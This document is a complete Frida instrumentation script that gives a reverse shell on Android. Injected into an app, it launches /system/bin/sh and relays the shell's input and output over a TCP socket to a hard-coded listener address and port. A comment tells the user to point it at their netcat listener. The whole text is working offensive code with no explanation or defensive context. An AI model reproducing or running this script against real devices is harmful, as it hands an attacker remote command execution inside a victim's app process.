Java.perform(function () {
  send("begin...");
  const Socket = Java.use('java.net.Socket');
  const OutputStream = Java.use('java.io.OutputStream');
  const InputStream = Java.use('java.io.InputStream');
  const JavaString = Java.use('java.lang.String');
  const ProcessBuilder = Java.use('java.lang.ProcessBuilder');
  const Thread = Java.use('java.lang.Thread');
  const ArrayList = Java.use('java.util.ArrayList');

  // change these to match your netcat listener
  const host = JavaString.$new('192.168.0.10');
  const port = 3636;

  var arr = Java.array('java.lang.String', ['/system/bin/sh']);
  var p = ProcessBuilder.$new.overload('[Ljava.lang.String;').call(ProcessBuilder, arr).redirectErrorStream(true).start();
  send("creating socket...");
  var s = Socket.$new.overload('java.lang.String', 'int').call(Socket, host, port);

  var pi = p.getInputStream();
  var pe = p.getErrorStream();
  var si = s.getInputStream();

  var po = p.getOutputStream(),
      so = s.getOutputStream();

  var i = 0;
  while(!s.isClosed()) {
    while(pi.available()>0) {
      so.write(pi.read());
    }
    while(pe.available()>0) {
      so.write(pe.read());
    }
    while(si.available()>0) {
      po.write(si.read());
    }

    so.flush();
    po.flush();

    Thread.sleep(50);
    try {
      p.exitValue();
      break;
    } catch (e){
      // ignore
    }
  }

  p.destroy();
  s.close();
});
